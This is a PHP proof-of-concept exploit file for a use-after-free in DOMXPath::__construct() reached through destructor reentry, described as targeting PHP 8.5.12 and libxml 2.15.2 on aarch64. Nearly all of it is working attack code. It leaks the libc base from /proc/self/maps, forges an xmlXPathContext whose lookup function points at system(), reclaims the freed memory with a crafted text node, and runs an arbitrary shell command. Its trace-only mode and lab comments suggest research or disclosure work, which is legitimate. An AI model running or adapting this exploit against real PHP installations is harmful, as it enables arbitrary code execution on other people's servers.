<?php
/*
 * PHP 8.5.12 DOMXPath::__construct() destructor-reentry RCE PoC.
 *
 * The recursive constructor leaves DOMXPath::dom.ptr pointing to an
 * xmlXPathContext which it freed.  While still in the callback destructor,
 * reclaim that 376-byte allocation with a 375-byte libxml text allocation,
 * install system() as funcLookupFunc, and evaluate an unknown XPath function.
 *
 * Environment-specific proof for this aarch64 lab image:
 *   - PHP 8.5.12 / libxml 2.15.2
 *   - glibc aarch64 system() offset 0x4bf90
 *   - /proc/self/maps readable
 *
 * Usage:
 *   php -n domxpath_reconstruct_rce.php ['command'] [zend_string_hdr=24]
 */

/*
 * Diagnostic mode performs the same /proc lookup and forged-context staging,
 * then triggers the original bug for ASan. It suppresses only reclamation and
 * indirect dispatch, so running it without ASan cannot execute a command.
 *
 *   USE_ZEND_ALLOC=0 \
 *   ASAN_OPTIONS=detect_leaks=0:halt_on_error=0:abort_on_error=0:symbolize=1 \
 *   /path/to/asan/php -n /tmp/poc/domxpath_reconstruct_rce.php --trace-only
 */
$TRACE_ONLY = in_array('--trace-only', $argv, true);
$CMD = $TRACE_ONLY ? 'trace-only-no-dispatch' : ($argv[1] ?? 'id > /tmp/pwned_xpath');
$CMD .= "\0";
$BOFF = $TRACE_ONLY ? 24 : (int) ($argv[2] ?? 24);

function say(string $fmt, ...$args): void {
    fprintf(STDERR, $fmt . "\n", ...$args);
}
function poke(string &$s, int $off, string $bytes): void {
    for ($i = 0, $n = strlen($bytes); $i < $n; $i++) {
        $s[$off + $i] = $bytes[$i];
    }
}
function pq(int $v): string {
    return pack('P', $v);
}
function print_php_trace(): void {
    say('[trace] PHP destructor-reentry frames:');
    foreach (debug_backtrace(DEBUG_BACKTRACE_IGNORE_ARGS) as $i => $frame) {
        $call = ($frame['class'] ?? '') . ($frame['type'] ?? '') . ($frame['function'] ?? 'unknown');
        $location = isset($frame['file'])
            ? $frame['file'] . ':' . ($frame['line'] ?? 0)
            : '[internal]';
        say('[trace] #PHP%d %s at %s', $i, $call, $location);
    }
}

say('[mode] %s', $TRACE_ONLY ? 'trace-only (staging enabled, dispatch disabled)' : 'native dispatch');
say('[chain] DOMXPath reconstruction UAF -> funcLookupFunc -> system()');
say('[runtime] PHP %s | libxml %s | pid %d', PHP_VERSION, LIBXML_DOTTED_VERSION, getmypid());

/* Resolve libc and system(). The native dispatch path is Linux/glibc-specific;
 * trace mode remains usable on platforms without /proc, including macOS. */
$mapsBefore = @file('/proc/self/maps', FILE_IGNORE_NEW_LINES);
if ($mapsBefore === false) {
    if (!$TRACE_ONLY) {
        die("/proc/self/maps is required by the native dispatch path\n");
    }
    $mapsBefore = [];
    say('[proc] /proc/self/maps unavailable on this platform');
}

$libcBase = null;
foreach ($mapsBefore as $line) {
    if (str_contains($line, 'libc.so.6')) {
        preg_match('/^([0-9a-f]+)-/', $line, $m);
        $libcBase = intval($m[1], 16);
        say('[proc] libc mapping: %s', trim($line));
        break;
    }
}
if ($libcBase === null) {
    if (!$TRACE_ONLY) {
        die("could not find libc mapping\n");
    }
    $system = 0;
    say('[dispatch] Linux/glibc target resolution unavailable; using diagnostic zero');
} else {
    $system = $libcBase + 0x4bf90;
    say('[dispatch] libc base = 0x%x', $libcBase);
    say('[dispatch] system target = 0x%x (base + 0x4bf90)', $system);
}

/*
 * Make a stable, address-known staging mapping.  A zeroed fake xmlDoc lives
 * here; only xmlDoc.children (+0x18) is inspected, and NULL means no root.
 * The command is staged here as funcLookupData/system()'s first argument.
 */
$SLEN = 8 * 1024 * 1024 - 24 - 1;
$oldMaps = array_fill_keys($mapsBefore, true);
$stage = str_repeat("\0", $SLEN);
$B = null;
$mapsAfter = @file('/proc/self/maps', FILE_IGNORE_NEW_LINES) ?: [];
foreach ($mapsAfter as $line) {
    if (isset($oldMaps[$line])) continue;
    if (preg_match('/^([0-9a-f]+)-([0-9a-f]+) rw-p/', $line, $m)
        && !str_contains($line, '/')
        && intval($m[2], 16) - intval($m[1], 16) >= 6 * 1024 * 1024
        && intval($m[1], 16) % (2 * 1024 * 1024) === 0) {
        $B = intval($m[1], 16) + $BOFF;
        say('[proc] staging mapping: %s', trim($line));
        break;
    }
}
if ($B === null) {
    if (!$TRACE_ONLY) {
        die("could not find staging mapping\n");
    }
    /* ASan commonly reserves its heap mappings before this allocation, so the
     * /proc diff has no new 2MB-aligned VMA. The forged bytes are never used in
     * trace mode; continue with zero-based diagnostic offsets. */
    say('[proc] no observable stable staging VMA in this mode/platform');
    say('[stage] using diagnostic offsets only; reclamation/dispatch remain disabled');
    $B = 0;
}

$O_DOC = 0x100;  // zeroed fake xmlDoc (children at +0x18 remains NULL)
$O_CMD = 0x300;
poke($stage, $O_CMD, $CMD);
say('[stage] zend string data base = 0x%x (mapping + %d)', $B, $BOFF);
say('[stage] forged xmlDoc = 0x%x (stage + 0x%x)', $B + $O_DOC, $O_DOC);
say('[stage] dispatch argument = 0x%x (stage + 0x%x)', $B + $O_CMD, $O_CMD);

/*
 * sizeof(xmlXPathContext) is 0x178 (376) in libxml 2.15.2 on aarch64.
 * A 375-byte DOM text value makes xmlStrndup allocate exactly 376 bytes.
 * Relevant offsets:
 *   +0x00 doc
 *   +0xb8 funcLookupFunc
 *   +0xc0 funcLookupData
 * The remainder stays zero (including lastError.code, dict, cache, limits).
 */
$fake = str_repeat("\0", 375);
$fake = substr_replace($fake, pq($B + $O_DOC), 0x00, 8);
$fake = substr_replace($fake, pq($system),       0xb8, 8);
$fake = substr_replace($fake, pq($B + $O_CMD),  0xc0, 8);
say('[context] forged xmlXPathContext request = 376 bytes (375-byte text + NUL)');
say('[context] +0x00 doc = 0x%x', $B + $O_DOC);
say('[context] +0xb8 funcLookupFunc = 0x%x', $system);
say('[context] +0xc0 funcLookupData = 0x%x', $B + $O_CMD);
say('[dispatch] planned call: funcLookupFunc(funcLookupData, "x", NULL)');

/* Prepare the spray container before opening the vulnerable window. */
$sprayDoc = Dom\XMLDocument::createEmpty();
$sprayRoot = $sprayDoc->appendChild($sprayDoc->createElement('r'));
$GLOBALS['sprayRoot'] = $sprayRoot;
$GLOBALS['fakeXPathContext'] = $fake;
$GLOBALS['TRACE_ONLY'] = $TRACE_ONLY;

class XPathCallbackHolder {
    public function cb($node = null): bool {
        return true;
    }

    public function __destruct() {
        say('[trigger] callback destructor entered');
        if ($GLOBALS['TRACE_ONLY']) {
            print_php_trace();
        }

        /*
         * Native allocator sequence:
         *   outer free(old context A)
         *   inner xmlXPathNewContext() reclaims A
         *   inner free(A), then stores A in DOMXPath::dom.ptr
         */
        say('[trigger] entering recursive DOMXPath::__construct()');
        $GLOBALS['xp']->__construct($GLOBALS['doc']);

        if ($GLOBALS['TRACE_ONLY']) {
            say('[trace] recursive constructor returned; inspect sanitizer/debugger output above');
            say('[trace] dispatch disabled by trace mode; reclamation was not attempted');
            return;
        }

        say('[trigger] recursive constructor returned; dom.ptr is dangling');

        /* Reclaim A and overwrite it with the forged context. */
        $GLOBALS['sprayRoot']->append($GLOBALS['fakeXPathContext']);
        say('[reclaim] 375-byte text allocation installed forged context');

        /*
         * Unknown-function lookup executes:
         *   ctx->funcLookupFunc(ctx->funcLookupData, "x", NULL)
         *   => system(command)
         */
        try {
            $GLOBALS['xp']->evaluate('x()', null, false);
        } catch (Throwable $e) {
            say('[*] evaluate returned after dispatch: %s', $e->getMessage());
        }
    }
}

$doc = new DOMDocument();
$doc->loadXML('<root><a/></root>');
$xp = new DOMXPath($doc);
$GLOBALS['doc'] = $doc;
$GLOBALS['xp'] = $xp;

$xp->registerNamespace('php', 'http://php.net/xpath');
$holder = new XPathCallbackHolder();
$xp->registerPhpFunctions(['cb' => [$holder, 'cb']]);
unset($holder);                 // registry owns the final reference

say('[trigger] entering outer DOMXPath::__construct()');
$xp->__construct($doc);
say('[trigger] outer reconstruction returned');

if ($TRACE_ONLY) {
    say('[trace] trigger returned; no dispatch was attempted');
    exit(0);
}

$proof = '/tmp/pwned_xpath';
if (file_exists($proof)) {
    say('[result] RCE CONFIRMED: %s', $proof);
    echo file_get_contents($proof);
} else {
    say('[result] command dispatched; default proof file was not found');
}
